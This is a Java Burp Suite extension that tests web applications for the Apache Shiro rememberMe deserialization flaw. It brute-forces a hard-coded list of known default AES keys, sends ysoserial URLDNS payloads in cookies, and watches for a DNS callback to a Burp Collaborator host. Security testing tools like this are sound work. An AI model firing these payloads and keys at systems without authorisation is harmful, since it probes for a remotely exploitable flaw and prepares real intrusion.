package burp;


import java.awt.Color;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Enumeration;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JTextArea;
import javax.swing.JTextPane;
import javax.swing.SwingUtilities;
import javax.swing.text.BadLocationException;
import javax.swing.text.Document;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.StyleConstants;

import sun.misc.BASE64Decoder;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import burp.ui.CmdPanel;



public class BurpExtender implements IBurpExtender, ITab, IHttpListener,IScopeChangeListener,IContextMenuFactory {

    private PrintWriter stdout;
    private PrintWriter stderr;
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private  JPanel mainPanel =new CmdPanel();
    IBurpCollaboratorClientContext context;
    String payload ;

    // implement IBurpExtender
    //
//    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
        // keep a reference to our callbacks object
        this.callbacks = callbacks;

        // obtain an extension helpers object
        helpers = callbacks.getHelpers();

        // obtain our output stream
        stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);
        context = callbacks.createBurpCollaboratorClientContext();
        // set our extension name
        
        
        payload  = context.generatePayload(true);//dns d地址
       
       
       callbacks.setExtensionName("Shiro Check ");
       stdout.println("https://github.com/bigsizeme");
       callbacks.getExtensionStateListeners();

        
        callbacks.registerContextMenuFactory(this);
//        BurpExtender.this.mainPanel = new CmdPanel();
//        
//        callbacks.customizeUiComponent(BurpExtender.this.mainPanel);
//        callbacks.addSuiteTab(this);
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
//              BurpExtender.this.mainPanel = new CmdPanel();
             
              callbacks.customizeUiComponent(BurpExtender.this.mainPanel);
              callbacks.addSuiteTab(BurpExtender.this);
            }
          });

        
    }

	public void scopeChanged() {
		
	}

	public void processHttpMessage(int toolFlag, boolean messageIsRequest,
			IHttpRequestResponse messageInfo) {
		
	}

	public String getTabCaption() {
		return "shiro check";
	}

	  public Component getUiComponent()
	  {
	    return this.mainPanel;
	  }
	  

	public List<JMenuItem> createMenuItems(final IContextMenuInvocation invocation) {
		List<JMenuItem> itemList = new ArrayList<JMenuItem>();
		JMenuItem item = new JMenuItem("Send to shiro check");
		
		item.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				clean();
				IHttpRequestResponse[] hrr = 	invocation.getSelectedMessages();
					Component comp = mainPanel.getComponent(0);
					if(comp instanceof JTextArea){
						JTextArea pane = (JTextArea)comp;
						pane.setText(helpers.bytesToString(hrr[0].getRequest()));
					}
				new Thread(new Runnable() {
					@Override
					public void run() {
						writeLog(hrr);
					}
				}).start();
			}
		});

		itemList.add(item);
		return itemList;
	}

private void writeLog(IHttpRequestResponse[] hrr){
	clean();
	setForeground();
	printLog2("checking .......");
//	mainPanel.getco
	String[] keys = {
			 
			 "4AvVhmFLUs0KTA3Kprsdag==",
             "3AvVhmFLUs0KTA3Kprsdag==",
             "kPH+bIxk5D2deZiIxcaaaA==",
             "2AvVhdsgUs0FSA3SDFAdag==",
             "6ZmI6I2j5Y+R5aSn5ZOlAA==",
             "wGiHplamyXlVB11UXWol8g==",
             "cmVtZW1iZXJNZQAAAAAAAA==",
             "Z3VucwAAAAAAAAAAAAAAAA==",
             "ZnJlc2h6Y24xMjM0NTY3OA==",
             "L7RioUULEFhRyxM7a2R/Yg==",
             "RVZBTk5JR0hUTFlfV0FPVQ==",
             "fCq+/xW488hMTCD+cmJ3aQ==",
	                                  "WkhBTkdYSUFPSEVJX0NBVA==",
	                                  "1QWLxg+NYmxraMoxAXu/Iw==",
	                                  "WcfHGU25gNnTxTlmJMeSpw==",
	                                  "a2VlcE9uR29pbmdBbmRGaQ==",
	                                  "bWluZS1hc3NldC1rZXk6QQ==",
	                                  "5aaC5qKm5oqA5pyvAAAAAA==",
	                                  "r0e3c16IdVkouZgk1TKVMg==",
	                                  "ZUdsaGJuSmxibVI2ZHc9PQ==",
	                                  "U3ByaW5nQmxhZGUAAAAAAA==",
	                                  "LEGEND-CAMPUS-CIPHERKEY=="};
    //
	 String payloadType = "URLDNS";
	 IRequestInfo reqInfo = helpers.analyzeRequest(hrr[0]);
	 List<String> headers = reqInfo.getHeaders();
	 List<IParameter>parameters = reqInfo.getParameters();
     byte[] rawrequest = hrr[0].getRequest();
     for (IParameter param : parameters) {
            rawrequest = callbacks.getHelpers().removeParameter(rawrequest, param);
        }
     
	final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
	try {
		ObjectPayload objectPayloadpayload = payloadClass.newInstance();
//		final Object object = objectPayloadpayload.getObject("http://"+payload);
//		Optional<byte[]> bbs = ByteArrayUtils.objectToBytes(object);
		
//		for(String base64key : keys){
			for(int i=0;i<keys.length;i++){
				String base64key = keys[i];
				printLog2("checking by key "+base64key+".........");
				Object object = objectPayloadpayload.getObject("http://"+i+"."+payload);
				Optional<byte[]> bbs = ByteArrayUtils.objectToBytes(object);
			byte[] key = new BASE64Decoder().decodeBuffer(base64key);
			String rememberMe = AES.EncryptByte(bbs.get(), key);
			rememberMe = rememberMe.replaceAll("\r|\n", "");
			headers.removeIf(header -> header != null && header.toLowerCase().startsWith("cookie:"));	
			headers.add("Cookie: rememberMe="+rememberMe);
			byte[] modifiedRawRequest = helpers.buildHttpMessage(headers, null);
		    String request = helpers.bytesToString(modifiedRawRequest);
		    stderr.println("[!] 当前使用秘钥 : "+base64key);
		    IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(hrr[0].getHttpService(), modifiedRawRequest);
		    List<IBurpCollaboratorInteraction> collaboratorInteractions = context.fetchCollaboratorInteractionsFor(payload);
		    
		    if (checkRequestResponse != null && checkRequestResponse.getResponse() != null
	        		 && collaboratorInteractions != null&& !collaboratorInteractions.isEmpty()){
//		    	 stderr.println("[!] collaboratorInteractions size:  "+collaboratorInteractions.size());
	
		    	 printLog("There is a shiro serialization vulnerability and url : "+reqInfo.getUrl());
		    	 for(IBurpCollaboratorInteraction aa:collaboratorInteractions){
		    		Map<String,String> maps =  aa.getProperties();
		    		maps.forEach((k,v)->{
		    			stderr.print("[!] key: "+k+" value: "+v);
		    		});
		    		printLog2("Request Type : "+maps.get("type"));
		    		printLog2("Client IP : "+maps.get("client_ip"));
		    		
		    		String rawQuery = maps.get("raw_query");
		    		printLog2("Raw Query : "+rawQuery);
		    		
		    		int index = getIndex(rawQuery);
		    		printLog2("key  : "+keys[index]);
		    	 }
		    	return;
		    }
		}
		
		printLog("No shiro serialization vulnerability ");
		
	} catch (InstantiationException e) {
		e.printStackTrace();
	} catch (IllegalAccessException e) {
		e.printStackTrace();
	} catch (Exception e) {
		e.printStackTrace();
	}
	
}

private int getIndex(String encodeString){
	Base64.Decoder decoder = Base64.getDecoder();
	String aaa = encodeString.substring(16);
	try {
		String decodeString  = new String(decoder.decode(aaa), "UTF-8");
	String indx = 	decodeString.substring(1,2);
	
	return Integer.parseInt(indx);
		
	} catch (UnsupportedEncodingException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
	return 100;
}
private void setForeground(){
	Component comp = mainPanel.getComponent(1);
	JTextArea pane = (JTextArea)comp;
	pane.setForeground(Color.BLACK);
}
private void printLog(String text){
	 stderr.println("text: "+text);
			Component comp = mainPanel.getComponent(1);
			if(comp instanceof JTextArea){
				 stderr.println("------------------------------------------");
				JTextArea pane = (JTextArea)comp;
				pane.setForeground(Color.RED);
//			    SimpleAttributeSet attrset = new SimpleAttributeSet();
//			    SimpleAttributeSet red = new SimpleAttributeSet();
//			    StyleConstants.setFontSize(attrset,12);
//			    StyleConstants.setForeground(red, Color.RED);
//			    Document docs = pane.getDocument();//获得文本对象
//			    try {
//					docs.insertString(docs.getLength(), text+"\n", attrset);
//				} catch (BadLocationException e) {
//					e.printStackTrace();
//				}
				pane.append(text+"\n");
			}
	
}


private void printLog2(String text){
	 stderr.println("text: "+text);
			Component comp = mainPanel.getComponent(1);
			if(comp instanceof JTextArea){
				 stderr.println("------------------------------------------");
				JTextArea pane = (JTextArea)comp;
				pane.append(text+"\n");
			}
	
}


private void clean(){
			Component comp = mainPanel.getComponent(1);
			if(comp instanceof JTextArea){
				 stderr.println("------------------------------------------");
				JTextArea pane = (JTextArea)comp;
				pane.setText("");
				
			}
	
}




}
